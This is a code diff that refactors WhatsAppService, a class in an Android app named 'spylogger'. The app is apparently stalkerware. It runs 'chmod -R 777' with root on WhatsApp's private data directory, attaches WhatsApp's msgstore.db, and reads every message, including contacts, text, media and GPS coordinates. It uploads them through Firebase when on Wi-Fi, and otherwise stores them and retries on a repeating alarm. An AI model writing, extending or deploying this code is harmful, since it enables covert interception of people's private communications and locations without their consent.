@@ -1,17 +1,14 @@
 package com.gravatasufoca.spylogger.services;
 
 import android.app.PendingIntent;
-import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager.NameNotFoundException;
-import android.os.Binder;
-import android.os.FileObserver;
-import android.os.IBinder;
 import android.util.Log;
 
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
-import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperExternal;
+import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperWhatsApp;
 import com.gravatasufoca.spylogger.helpers.NetworkUtil;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Mensagem;
@@ -21,7 +18,6 @@ import com.gravatasufoca.spylogger.model.TipoMidia;
 import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.model.whatsapp.Messages;
 import com.gravatasufoca.spylogger.receivers.Alarm;
-import com.gravatasufoca.spylogger.receivers.PrimeiraCarga;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.vos.FcmMessageVO;
 import com.j256.ormlite.dao.Dao;
@@ -43,31 +39,20 @@ import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
-public class WhatsAppService extends Service {
+public class WhatsAppService  implements Mensageiro{
 
     private static final int MAX_MSGS = 5000;
-    private String pathToWatch;
     private String inFileName;
-    private DatabaseHelperExternal external;
-    private Dao<Messages, Integer> daoMsgExternal;
 
-    private DatabaseHelper dbHelper;
+    private Context context;
 
-    private final IBinder mBinder = new LocalBinder();
-    private boolean primeiraVez;
-
-    public class LocalBinder extends Binder {
-        WhatsAppService getService() {
-            return WhatsAppService.this;
+    public WhatsAppService(Context context) {
+        if(context!=null) {
+            this.context = context;
+            onCreate();
+        }else{
+            throw new RuntimeException("eh necessario um contexto valido");
         }
-    }
-
-    public WhatsAppService() {
-    }
-
-    @Override
-    public IBinder onBind(Intent intent) {
-        return mBinder;
     }
 
     private void chmod() {
@@ -76,8 +61,8 @@ public class WhatsAppService extends Service {
             CommandCapture command = new CommandCapture(0, "chmod -R 777 "
                     + android.os.Environment.getDataDirectory().toString()
                     + "/data/com.whatsapp", "chmod -R 777 "
-                    + getApplicationContext().getPackageManager()
-                    .getPackageInfo(getPackageName(), 0).applicationInfo.dataDir);
+                    + context.getPackageManager()
+                    .getPackageInfo(context.getPackageName(), 0).applicationInfo.dataDir);
             RootTools.getShell(true).add(command);
         } catch (Exception e) {
             e.printStackTrace();
@@ -85,69 +70,30 @@ public class WhatsAppService extends Service {
 
     }
 
-    @Override
     public void onCreate() {
-
-        pathToWatch = android.os.Environment.getDataDirectory().toString()
-                + "/data/com.whatsapp/databases/msgstore.db";
-
         chmod();
         try {
-            inFileName = getApplicationContext().getPackageManager()
-                    .getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
+            inFileName = context.getPackageManager()
+                    .getPackageInfo(context.getPackageName(), 0).applicationInfo.dataDir
                     + "/databases/" + DatabaseHelper.DATABASE_NAME;
         } catch (NameNotFoundException e) {
-            e.printStackTrace();
+           Log.e("spylogger",e.getMessage());
         }
-
-
     }
 
 
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null) {
-            primeiraVez = intent.getBooleanExtra("primeiraVez", false);
-        }
-
-        if ((new File(DatabaseHelperExternal.DATABASE_NAME)).exists()) {
-            Log.d("WHATSLOG - FLAGS", Integer.toString(flags));
-            Utils.context = getApplicationContext();
-            setObserver();
+    public void start() {
+        if ((new File(DatabaseHelperWhatsApp.DATABASE_NAME)).exists()) {
             updateTopicos();
-
-            Log.d("WHATSLOG - OBSESRVER", Utils.whatsObserver.toString());
-        } else {
-            continuarServicos();
         }
-        return START_STICKY;
     }
 
 
-    private void setObserver() {
-        Log.i("SPYLOGGER", "INICIANDO OBSERVER WHATSAPP");
-        Utils.whatsObserver = new FileObserver(pathToWatch) { // set up a file observer to
-            @Override
-            public void onEvent(int event, String file) {
-
-                switch (event) {
-                    case FileObserver.MODIFY:
-                        Log.d("DEBUG", "MODIFY:" + pathToWatch + file);
-
-                        updateTopicos();
-                        break;
-                    default:
-                        break;
-                }
-
-            }
-        };
-        Utils.whatsObserver.startWatching(); // START OBSERVING
-    }
 
     private synchronized void updateTopicos() {
-        external = new DatabaseHelperExternal(getApplicationContext());
-        dbHelper = new DatabaseHelper((getApplicationContext()));
+        DatabaseHelperWhatsApp external = new DatabaseHelperWhatsApp(context);
+        DatabaseHelper dbHelper = new DatabaseHelper(context);
+        Dao<Messages,Integer> daoMsgExternal;
         GenericRawResults<String[]> raws = null;
         List<Topico> topicos = new ArrayList<>();
         Iterator<String[]> iterator;
@@ -187,6 +133,8 @@ public class WhatsAppService extends Service {
                 if (raws != null) {
                     raws.close();
                 }
+                dbHelper.close();
+                external.close();
                 updateMsgs(topicos);
             } catch (IOException e) {
                 Log.d("spylogger", "nao foi possivel fechar a conexao: " + e.getMessage());
@@ -195,13 +143,20 @@ public class WhatsAppService extends Service {
     }
 
     private synchronized void updateMsgs(List<Topico> topicos) {
+        DatabaseHelperWhatsApp external = new DatabaseHelperWhatsApp(context);
+        DatabaseHelper dbHelper = new DatabaseHelper(context);
+        Dao<Messages,Integer> daoMsgExternal;
+
         GenericRawResults<Object[]> rawResults = null;
         List<Mensagem> mensagens = new ArrayList<>();
         List<Mensagem> mensagensComMidia = new ArrayList<>();
         Iterator<Object[]> iterator;
         try {
+            dbHelper.getWritableDatabase();
+            daoMsgExternal = external.getMessagesDao();
+            daoMsgExternal.executeRaw("attach database '" + inFileName + "' as 'localdb' ");
 
-            rawResults = this.daoMsgExternal
+            rawResults = daoMsgExternal
                     .queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end,media_mime_type,raw_data,thumb_image,latitude,longitude from messages where key_remote_jid!='-1' and _id not in( select idReferencia from localdb.mensagem ) "
                             , new DataType[]{DataType.INTEGER, DataType.STRING, DataType.INTEGER, DataType.STRING, DataType.DATE_LONG, DataType.STRING, DataType.STRING, DataType.STRING, DataType.DATE_LONG, DataType.INTEGER, DataType.STRING, DataType.BYTE_ARRAY, DataType.BYTE_ARRAY});
 
@@ -221,6 +176,8 @@ public class WhatsAppService extends Service {
                     }
                     try {
                         rawResults.close();
+                        dbHelper.close();
+                        external.close();
                     } catch (IOException e) {
                     }
                     updateMsgs(topicos);
@@ -301,6 +258,8 @@ public class WhatsAppService extends Service {
                         if (rawResults != null) {
                             rawResults.close();
                         }
+                        dbHelper.close();
+                        external.close();
                     } catch (IOException ee) {
                     }
                     updateMsgs(topicos);
@@ -315,35 +274,22 @@ public class WhatsAppService extends Service {
                 if (rawResults != null) {
                     rawResults.close();
                 }
-                if (dbHelper != null && dbHelper.isOpen()) {
+                if (dbHelper != null) {
                     dbHelper.close();
                 }
 
-                if (external != null && external.isOpen()) {
+                if (external != null) {
                     external.close();
                 }
                 verificaArquivos(mensagensComMidia, 1);
-                continuarServicos();
             } catch (IOException e) {
             }
         }
     }
 
-    private void continuarServicos() {
-        if (primeiraVez) {
-            primeiraVez = false;
-            Intent intent = new Intent(Utils.PRIMEIRA_CARGA);
-            intent.putExtra(PrimeiraCarga.MESSENGER, true);
-            sendBroadcast(intent);
-        } else {
-            if (NetworkUtil.isWifi(getApplicationContext())) {
-                Utils.enviarTudo(getApplicationContext());
-            }
-        }
-    }
 
     private void verificaArquivos(List<Mensagem> mensagens, final int contador) {
-        if (primeiraVez) {
+        if(mensagens!=null && mensagens.size()>10){
             return;
         }
         Map<Mensagem, File> arquivos = new HashMap<>();
@@ -372,18 +318,19 @@ public class WhatsAppService extends Service {
         /**
          * envia caso esteja no wifi
          */
-        if (NetworkUtil.isWifi(getApplicationContext())) {
+        if (NetworkUtil.isWifi(context)) {
 
             FcmMessageVO fcmMessageVO = new FcmMessageVO();
             fcmMessageVO.setTipoAcao(TipoAcao.REENVIAR_ARQUIVOS);
             fcmMessageVO.setChave(FirebaseInstanceId.getInstance().getToken());
 
-            FcmHelperService fcmHelperService = new FcmHelperService(getApplicationContext(), fcmMessageVO);
+            FcmHelperService fcmHelperService = new FcmHelperService(context, fcmMessageVO);
             fcmHelperService.enviarArquivos(new ArrayList<Mensagem>(existentes));
         } else {
             /**
              * guardo para enviar depois quando estiver conectado
              */
+            DatabaseHelper dbHelper = new DatabaseHelper(context);
             try {
                 Dao<Mensagem, Integer> dao = dbHelper.getDao(Mensagem.class);
 
@@ -393,7 +340,9 @@ public class WhatsAppService extends Service {
                 }
 
             } catch (SQLException e) {
-                e.printStackTrace();
+                Log.e("spylogger",e.getMessage());
+            }finally {
+                dbHelper.close();
             }
         }
 
@@ -402,16 +351,16 @@ public class WhatsAppService extends Service {
                 Utils.alarm = new Alarm();
             }
 
-            Intent intent = new Intent(getApplicationContext(), Alarm.class);
-            final PendingIntent pi = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, 0);
+            Intent intent = new Intent(context, Alarm.class);
+            final PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, 0);
 
-            Utils.alarm.setRepeatingAlarm(getApplicationContext(), pi, 5, new TaskComplete() {
+            Utils.alarm.setRepeatingAlarm(context, pi, 5, new TaskComplete() {
                 @Override
                 public void onFinish(Object object) {
                     if (contador + 1 < 4) {
                         verificaArquivos(new ArrayList<Mensagem>(pendentes), contador + 1);
                     } else {
-                        Utils.alarm.cancelAlarm(getApplicationContext(), pi);
+                        Utils.alarm.cancelAlarm(context, pi);
                     }
                 }
             });
